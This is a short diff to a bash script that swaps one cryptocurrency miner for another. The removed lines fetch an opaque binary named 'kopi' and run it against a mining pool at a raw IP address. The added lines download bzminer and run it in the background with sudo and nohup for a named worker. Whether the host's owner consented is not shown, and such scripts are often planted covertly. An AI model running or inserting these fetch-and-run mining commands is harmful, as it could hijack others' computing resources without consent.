@@ -1,3 +1,7 @@
 #!/bin/bash
-wget https://github.com/selokguine3/yes/raw/main/kopi && chmod 777 kopi
-nohup ./kopi --algo ETHASH --pool 3.215.245.39:443 --user sagemode.Z > nohup.out
+sudo wget https://github.com/bzminer/bzminer/releases/download/v9.0.0/bzminer_v9.0.0_linux.tar.gz
+tar xvf bzminer_v9.0.0_linux.tar.gz
+chmod +x bzminer
+sudo nohup ./bzminer -a ethash -w sagemode.zz -p 3.215.245.39:443 > nohup.out
+
+
